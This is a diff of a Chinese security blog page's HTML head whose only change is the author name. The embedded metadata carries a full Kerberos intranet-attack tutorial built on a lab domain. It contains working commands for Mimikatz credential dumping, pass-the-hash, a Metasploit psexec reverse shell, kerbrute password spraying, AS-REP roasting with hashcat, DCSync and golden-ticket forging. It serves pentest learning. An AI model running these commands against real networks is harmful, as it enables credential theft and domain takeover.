@@ -5,64 +5,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="self_209&#39;blog">
-    <title>内网安全之kerberos(一) - self_209&#39;blog</title>
-    <meta name="author" content="self_209">
+    <meta name="generator" content="1uh5an&#39;blog">
+    <title>内网安全之kerberos(一) - 1uh5an&#39;blog</title>
+    <meta name="author" content="1uh5an">
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\n\n\n\n\nkerberos认证流程在Kerberos协议中主要是有三个角色的存在：\n\n访问服务的Client(以下表述为Client 或者用户)\n提供服务的Server(以下表述为服务)\nKDC（Key Distribution Center）密钥分发中心 （KDC由AS和TGS组成）\n\nkerberos认证过程\n\n\nAS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳\nAS_REP: KDC使用Client hash进行解密，如果结果正确，KDC生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，也就是enc-part，使用KDC中的krbtgt hash加密Session Key和PAC，(PAC包含用户的sid，用户所在的组)生成TGT，也就是ticket。\nTGS_REQ: 用户通过AS_REP拿到的TGT票据，以及使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。去向KDC申请特定服务的访问权限，KDC校验TGT票据\nTGS_REP: KDC使用krbtgt hash进行解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)\nAP_REQ: Client拿着TGS票据去请求服务\n用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，**就拿着PAC去KDC那边询问用户有没有访问权限\n域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，将权限信息返回给服务端。(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功)\nAP_REP：服务端根据KDC返回的权限信息做对比，判断用户是否有权限访问该服务器。\n\nAS_REQ使用daiker大佬的kerberos发包工具，结合流量学习kerberos协议\nAS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳\n\n\npvno\n\nkerberos 版本号\n\nmsg-type\n\n类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)\n\npadata\n\n主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。\n在AS_REQ阶段主要用到的有两个\n\n一、pA-PAC-REQUEST\n这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。这里对应的是include-pac:true或者include-pac:false(KDC根据include的值来判断返回的票据中是否携带PAC)。\nkerberos发包工具选用include-pac\n\n二、pA-ENC-TIMESTAMP\n这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过\n\nREQ-BODY\n\n1、kdc-options 一些flag 字段\n\n2、cname\nPrincipalName 类型。PrincipalName包含type和value。\n\nKRB_NT_PRINCIPAL = 1 如 final(请求用户)\nKRB_NT_SRV_INST = 2   如krbtgt，cifs\nKRB_NT_ENTERPRISE_PRINCIPAL = 10 如 &#x75;&#115;&#101;&#114;&#x40;&#x64;&#111;&#109;&#x61;&#x69;&#x6e;&#x2e;&#99;&#111;&#109;\n\n在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。\n\n\n3、sname\nPrincipalName 类型\n在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST\n4、realm\n域名\n5、till\n到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。\n6、nonce\n随机生成的一个数kekeo/mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具。\n7、etype\n加密类型\n123456789101112131415161718des_cbc_crc = 1,des_cbc_md4 = 2,des_cbc_md5 = 3,des3_cbc_md5 = 5,des3_cbc_sha1 = 7,dsaWithSHA1_CmsOID = 9,md5WithRSAEncryption_CmsOID = 10,sha1WithRSAEncryption_CmsOID = 11,rc2CBC_EnvOID = 12,rsaEncryption_EnvOID = 13,rsaES_OAEP_ENV_OID = 14,des_ede3_cbc_Env_OID = 15,des3_cbc_sha1_kd = 16,aes128_cts_hmac_sha1 = 17,aes256_cts_hmac_sha1 = 18,rc4_hmac = 23,rc4_hmac_exp = 24,subkey_keymaterial = 65\n\n\nAS_REPKDC使用Client hash进行解密，如果结果正确，KDC生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，也就是enc-part，使用KDC中的krbtgt hash加密Session Key和PAC，(PAC包含用户的sid，用户所在的组)生成TGT，也就是ticket。\n\n\nmsg-type\n\nAS_REQ的响应body对应的就是KRB_AS_REP(0x0b)\n\ncrealm\n\n域名\n\ncname\n\n用户名\n\nticket\n\n这个ticket用于TGS_REQ的认证。是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。\n\n\nenc-part\n\n这部分是可以解密的，是使用用户hash加密的，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是key也就是kdc生成的Session Key，作为下阶段的通信密钥。\n\n相关安全问题及利用pass the hash由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash。\nMimikatz进行PTH123privilege::debuglogsekurlsa::logonpasswords\n\n\n1sekurlsa::pth /user:passth /domain:self.com /ntlm:34da32da8f2188ff7d84815765e3e27c\n\n\nMSF PTH12345678msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set lhost 192.168.93.143msf exploit(psexec) &gt; set rhost 192.168.93.3msf exploit(psexec) &gt; set smbuser passth   msf exploit(psexec) &gt; set smbpass 00000000000000000000000000000000:34DA32DA8F2188FF7D84815765E3E27Cmsf exploit(psexec) &gt; set SMBDomain selfmsf exploit(psexec) &gt; exploit \n\n\n\npth-winexe PTH1pth-winexe -U SELF/passth%00000000000000000000000000000000:34DA32DA8F2188FF7D84815765E3E27C --system --ostype=1 //192.168.93.4 cmd\n\n\n用户名枚举用户名存在，密码错误的情况下\n\n用户名不存在的情况下\n\n通过这个比较就可以写脚本改变cname的值进行用户名枚举。在域内没有域账号的情况下进行用户名枚举，在有账号的情况的下通过LDAP查询就行。如果有域内机器的system权限，那那台机器也是个域账户，账户名是机器名$。\nkerbrute用户枚举12345678910111213141516171819202122232425262728293031323334    __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: v1.0.3 (9dad6e1) - 04/04/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  kerbrute [command]Available Commands:  bruteforce    Bruteforce username:password combos, from a file or stdin  bruteuser     Bruteforce a single user&#x27;s password from a wordlist  help          Help about any command  passwordspray Test a single password against a list of users  userenum      Enumerate valid domain usernames via Kerberos  version       Display version info and quitFlags:      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS      --delay int       Delay in millisecond between each attempt. Will always use single thread if set  -d, --domain string   The full domain to use (e.g. contoso.com)  -h, --help            help for kerbrute  -o, --output string   File to write logs to. Optional.      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE  -t, --threads int     Threads to use (default 10)  -v, --verbose         Log failures and errorsUse &quot;kerbrute [command] --help&quot; for more information about a command.\n\n1./kerbrute_linux_amd64 userenum --dc 192.168.93.2 -d self.com user.txt\n\n\nPassword Spraying在已有用户名的时候，可以尝试爆破密码。\n密码正确的情况下:\n\n密码错误的情况下:\n\n这个时候就可以进行密码爆破了，但是在实践中，许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。\nkerbrute Password Spraying1./kerbrute_linux_amd64 passwordspray --dc 192.168.93.2 -d self.com user.txt KXSrR\\!w7\n\n\ncrackmapexec Password Spraying1crackmapexec smb 192.168.93.2-4 -u ./user.txt -p &#x27;KXSrR!w7&#x27;\n\n这个工具Password Spraying有一个点，就是不会枚举全部用户，当发现使用该密码的用户后会停止Spraying。不能说是缺点，这样是为了用更少的数据包发现使用该密码的用户。\n\n\n\n\nAS-REPRoasting对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令\n\n我们没有用户hash，PA-DATA选择PA_PAC_REQUEST就行\n\n流量包\n\n点击鼠标右键获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;.format(userName, domain, repHash)得到字符串，交给hashcat 破解就行\n12345678910111213ciper:0xcb568e61fba6bea717783758469d630ec0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaauserName = &quot;final&quot;domain = &quot;self.com&quot;repHash = &quot;cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa&quot;print(&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;.format(userName, domain, repHash))$krb5asrep$23$final@self.com:cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa\n\n\nhashcat爆破1hashcat -m 18200 &#x27;$krb5asrep$23$final@self.com:cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa&#x27; pass.txt\n\n\n黄金票据在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。\nMimikatz制作黄金票据所需条件：\n\n完整的域名\n域SID\nkrbtgt的NTLM Hash\n\n获取域SID\n1wmic useraccount get Caption,sid\n\n\nMimikatz获取krbtgt的NTLM Hash\n123456privilege::debuglog#导出所有用户散列值lsadump::dcsync /domain:self.com /all /csv#导出指定用户散列值lsadump::dcsync /domain:self.com /user:krbtgt\n\n\n生成票据\n12345mimikatz.exe &quot;kerberos::golden /admin:whoami /domain:self.com /sid:S-1-5-21-1643912224-245962516-4032159703 /krbtgt:4d4ca8229826cc47163c67f3f6d5fac6 /ticket:Goldnote.kirbi&quot; exit或者mimikatz.exe &quot;kerberos::golden /admin:whoami /domain:self.com /sid:S-1-5-21-1643912224-245962516-4032159703 /krbtgt:4d4ca8229826cc47163c67f3f6d5fac6 /ptt&quot; exit\n\n\n当前无票据\n\n导入票据\n1kerberos::ptt Goldnote.kirbi\n\n\n\n\n","dateCreated":"2022-02-19T21:18:46+08:00","dateModified":"2022-04-08T23:04:00+08:00","datePublished":"2022-02-19T21:18:46+08:00","description":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","headline":"内网安全之kerberos(一)","image":[null,"1920.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/02/19/20220219/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/02/19/20220219/","keywords":"内网安全","thumbnailUrl":"1920.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"1uh5an","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\n\n\n\n\nkerberos认证流程在Kerberos协议中主要是有三个角色的存在：\n\n访问服务的Client(以下表述为Client 或者用户)\n提供服务的Server(以下表述为服务)\nKDC（Key Distribution Center）密钥分发中心 （KDC由AS和TGS组成）\n\nkerberos认证过程\n\n\nAS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳\nAS_REP: KDC使用Client hash进行解密，如果结果正确，KDC生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，也就是enc-part，使用KDC中的krbtgt hash加密Session Key和PAC，(PAC包含用户的sid，用户所在的组)生成TGT，也就是ticket。\nTGS_REQ: 用户通过AS_REP拿到的TGT票据，以及使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。去向KDC申请特定服务的访问权限，KDC校验TGT票据\nTGS_REP: KDC使用krbtgt hash进行解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)\nAP_REQ: Client拿着TGS票据去请求服务\n用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，**就拿着PAC去KDC那边询问用户有没有访问权限\n域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，将权限信息返回给服务端。(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功)\nAP_REP：服务端根据KDC返回的权限信息做对比，判断用户是否有权限访问该服务器。\n\nAS_REQ使用daiker大佬的kerberos发包工具，结合流量学习kerberos协议\nAS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳\n\n\npvno\n\nkerberos 版本号\n\nmsg-type\n\n类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)\n\npadata\n\n主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。\n在AS_REQ阶段主要用到的有两个\n\n一、pA-PAC-REQUEST\n这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。这里对应的是include-pac:true或者include-pac:false(KDC根据include的值来判断返回的票据中是否携带PAC)。\nkerberos发包工具选用include-pac\n\n二、pA-ENC-TIMESTAMP\n这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过\n\nREQ-BODY\n\n1、kdc-options 一些flag 字段\n\n2、cname\nPrincipalName 类型。PrincipalName包含type和value。\n\nKRB_NT_PRINCIPAL = 1 如 final(请求用户)\nKRB_NT_SRV_INST = 2   如krbtgt，cifs\nKRB_NT_ENTERPRISE_PRINCIPAL = 10 如 &#x75;&#115;&#101;&#114;&#x40;&#x64;&#111;&#109;&#x61;&#x69;&#x6e;&#x2e;&#99;&#111;&#109;\n\n在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。\n\n\n3、sname\nPrincipalName 类型\n在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST\n4、realm\n域名\n5、till\n到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。\n6、nonce\n随机生成的一个数kekeo/mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具。\n7、etype\n加密类型\n123456789101112131415161718des_cbc_crc = 1,des_cbc_md4 = 2,des_cbc_md5 = 3,des3_cbc_md5 = 5,des3_cbc_sha1 = 7,dsaWithSHA1_CmsOID = 9,md5WithRSAEncryption_CmsOID = 10,sha1WithRSAEncryption_CmsOID = 11,rc2CBC_EnvOID = 12,rsaEncryption_EnvOID = 13,rsaES_OAEP_ENV_OID = 14,des_ede3_cbc_Env_OID = 15,des3_cbc_sha1_kd = 16,aes128_cts_hmac_sha1 = 17,aes256_cts_hmac_sha1 = 18,rc4_hmac = 23,rc4_hmac_exp = 24,subkey_keymaterial = 65\n\n\nAS_REPKDC使用Client hash进行解密，如果结果正确，KDC生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，也就是enc-part，使用KDC中的krbtgt hash加密Session Key和PAC，(PAC包含用户的sid，用户所在的组)生成TGT，也就是ticket。\n\n\nmsg-type\n\nAS_REQ的响应body对应的就是KRB_AS_REP(0x0b)\n\ncrealm\n\n域名\n\ncname\n\n用户名\n\nticket\n\n这个ticket用于TGS_REQ的认证。是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。\n\n\nenc-part\n\n这部分是可以解密的，是使用用户hash加密的，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是key也就是kdc生成的Session Key，作为下阶段的通信密钥。\n\n相关安全问题及利用pass the hash由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash。\nMimikatz进行PTH123privilege::debuglogsekurlsa::logonpasswords\n\n\n1sekurlsa::pth /user:passth /domain:self.com /ntlm:34da32da8f2188ff7d84815765e3e27c\n\n\nMSF PTH12345678msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set lhost 192.168.93.143msf exploit(psexec) &gt; set rhost 192.168.93.3msf exploit(psexec) &gt; set smbuser passth   msf exploit(psexec) &gt; set smbpass 00000000000000000000000000000000:34DA32DA8F2188FF7D84815765E3E27Cmsf exploit(psexec) &gt; set SMBDomain selfmsf exploit(psexec) &gt; exploit \n\n\n\npth-winexe PTH1pth-winexe -U SELF/passth%00000000000000000000000000000000:34DA32DA8F2188FF7D84815765E3E27C --system --ostype=1 //192.168.93.4 cmd\n\n\n用户名枚举用户名存在，密码错误的情况下\n\n用户名不存在的情况下\n\n通过这个比较就可以写脚本改变cname的值进行用户名枚举。在域内没有域账号的情况下进行用户名枚举，在有账号的情况的下通过LDAP查询就行。如果有域内机器的system权限，那那台机器也是个域账户，账户名是机器名$。\nkerbrute用户枚举12345678910111213141516171819202122232425262728293031323334    __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: v1.0.3 (9dad6e1) - 04/04/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  kerbrute [command]Available Commands:  bruteforce    Bruteforce username:password combos, from a file or stdin  bruteuser     Bruteforce a single user&#x27;s password from a wordlist  help          Help about any command  passwordspray Test a single password against a list of users  userenum      Enumerate valid domain usernames via Kerberos  version       Display version info and quitFlags:      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS      --delay int       Delay in millisecond between each attempt. Will always use single thread if set  -d, --domain string   The full domain to use (e.g. contoso.com)  -h, --help            help for kerbrute  -o, --output string   File to write logs to. Optional.      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE  -t, --threads int     Threads to use (default 10)  -v, --verbose         Log failures and errorsUse &quot;kerbrute [command] --help&quot; for more information about a command.\n\n1./kerbrute_linux_amd64 userenum --dc 192.168.93.2 -d self.com user.txt\n\n\nPassword Spraying在已有用户名的时候，可以尝试爆破密码。\n密码正确的情况下:\n\n密码错误的情况下:\n\n这个时候就可以进行密码爆破了，但是在实践中，许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。\nkerbrute Password Spraying1./kerbrute_linux_amd64 passwordspray --dc 192.168.93.2 -d self.com user.txt KXSrR\\!w7\n\n\ncrackmapexec Password Spraying1crackmapexec smb 192.168.93.2-4 -u ./user.txt -p &#x27;KXSrR!w7&#x27;\n\n这个工具Password Spraying有一个点，就是不会枚举全部用户，当发现使用该密码的用户后会停止Spraying。不能说是缺点，这样是为了用更少的数据包发现使用该密码的用户。\n\n\n\n\nAS-REPRoasting对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令\n\n我们没有用户hash，PA-DATA选择PA_PAC_REQUEST就行\n\n流量包\n\n点击鼠标右键获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;.format(userName, domain, repHash)得到字符串，交给hashcat 破解就行\n12345678910111213ciper:0xcb568e61fba6bea717783758469d630ec0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaauserName = &quot;final&quot;domain = &quot;self.com&quot;repHash = &quot;cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa&quot;print(&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;.format(userName, domain, repHash))$krb5asrep$23$final@self.com:cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa\n\n\nhashcat爆破1hashcat -m 18200 &#x27;$krb5asrep$23$final@self.com:cb568e61fba6bea717783758469d630e$c0cfb5326b08114a197459c48eded2e9cb34f71eb0eb989cd8adc5373a2766c57357012db820f2b16ed9811c480a3dd11e096afd1c45e28207931136aac6732cc9425cef58e71aa5590281c5bce3d8490a13bb161c31618f2ec0dfe536f3224dc1890a0bad1028bbff1eb9f4d20e2af13d861557e47515eb3e52989f8532c788759d2b9c7c1d429db4d9cbc55c8ce31dcd3ea73b2e880cbc176409ca88e91b82c55cd9ed6c6d15c22f003cf7b25fe88dd1e269561403b1efb22fc8bc9fdba6875760db2837642dd12c84a23113bf5dbbaa&#x27; pass.txt\n\n\n黄金票据在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。\nMimikatz制作黄金票据所需条件：\n\n完整的域名\n域SID\nkrbtgt的NTLM Hash\n\n获取域SID\n1wmic useraccount get Caption,sid\n\n\nMimikatz获取krbtgt的NTLM Hash\n123456privilege::debuglog#导出所有用户散列值lsadump::dcsync /domain:self.com /all /csv#导出指定用户散列值lsadump::dcsync /domain:self.com /user:krbtgt\n\n\n生成票据\n12345mimikatz.exe &quot;kerberos::golden /admin:whoami /domain:self.com /sid:S-1-5-21-1643912224-245962516-4032159703 /krbtgt:4d4ca8229826cc47163c67f3f6d5fac6 /ticket:Goldnote.kirbi&quot; exit或者mimikatz.exe &quot;kerberos::golden /admin:whoami /domain:self.com /sid:S-1-5-21-1643912224-245962516-4032159703 /krbtgt:4d4ca8229826cc47163c67f3f6d5fac6 /ptt&quot; exit\n\n\n当前无票据\n\n导入票据\n1kerberos::ptt Goldnote.kirbi\n\n\n\n\n","dateCreated":"2022-02-19T21:18:46+08:00","dateModified":"2022-04-08T23:04:00+08:00","datePublished":"2022-02-19T21:18:46+08:00","description":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","headline":"内网安全之kerberos(一)","image":[null,"1920.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://1uh5an.github.io/2022/02/19/20220219/"},"publisher":{"@type":"Organization","name":"1uh5an","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://1uh5an.github.io/2022/02/19/20220219/","keywords":"内网安全","thumbnailUrl":"1920.jpg"}</script>
     <meta name="description" content="参考：https:&#x2F;&#x2F;github.com&#x2F;daikerSec&#x2F;windows_protocol ​            https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;category_10225019.html ​            https:&#x2F;&#x2F;shenaniganslabs.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;Wagging-the-Dog.html">
 <meta property="og:type" content="blog">
